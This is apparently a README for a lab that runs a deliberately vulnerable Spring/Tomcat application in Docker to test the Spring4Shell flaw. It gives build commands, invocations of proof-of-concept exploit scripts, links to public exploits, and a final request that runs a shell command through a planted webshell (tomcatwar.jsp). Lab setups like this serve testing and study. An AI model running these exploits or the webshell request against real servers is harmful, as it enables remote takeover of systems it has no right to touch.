# Example of a spring4shell vulnerable Tomcat application

![spring4shellapplication](spring4shellapplication.png)

## Example (Docker)

An example of a vulnerable Tomcat application + server.

War files built from /spring-war folder. (It is recommended to build your own war files but i have provided one based on <https://spring.io/guides/gs/handling-form-submission/>)

### Build

Building the docker version of the vunurable application, you can build your own war files.

### Building your own war file

You can use the provided spring-form.war or build your own

#### Prerequisites (Only if building your own war files)

- Java
- Java JDK (I have only tested with JDK 18)
- [Maven](https://maven.apache.org/install.html)

```sh
cd spring-war
mvn clean package
cd target
mv spring-form.war ../../ # Linux move the war file to vunerable-tomcat
move spring-form.war ../../ # Windows
cd ../../
```

### Building and starting the docker container

```sh
docker build -t vulnerable-tomcat .
docker run -it --rm -p 8888:8080 vulnerable-tomcat
```

Wait about 20 seconds for the server to start. Then run the exploit script.

```sh
python3 poc.py --url http://<dockerip>:8888/spring-form/greeting
#or docker variant
docker pull ghcr.io/bobtheshoplifter/spring4shell-poc:main
docker run ghcr.io/bobtheshoplifter/spring4shell-poc:main --url http://<dockerip>:8888/spring-form/greeting
```

## Example (Manual/Old)

Found intresting poc here : <https://github.com/craig/SpringCore0day/blob/main/exp.py> [^1]. & <https://twitter.com/vxunderground/status/1509170582469943303>

<https://github.com/reznok/Spring4Shell-POC> - Docker, POC

- clone sample repo from <https://spring.io/guides/gs/handling-form-submission/>
- you can skip right to the gs-handling-form-submission/complete directory, no need to follow the tutorial
- modify it so that you can build a war file (<https://www.baeldung.com/spring-boot-war-tomcat-deploy>). build war file :)
- install tomcat9 + java 11 (i did it on ubuntu 20.04 via apt-get)
- deploy the war file
- update the PoC (<https://share.vx-underground.org/>) to write the tomcatwar.jsp file to webapps/handling-form-submission instead of webapps/ROOT
- run PoC (ignore the URL it gives you for the webshell): python3 exp.py --url <http://your.ip.here:8080/handling-form-submission-complete/greeting>
- you should see the "tomcatwar.jsp" file now in webapps/handling-form-submission
- hit <http://your.ip.here:8080/handling-form-submission/tomcatwar.jsp?pwd=j&cmd=id> to see the results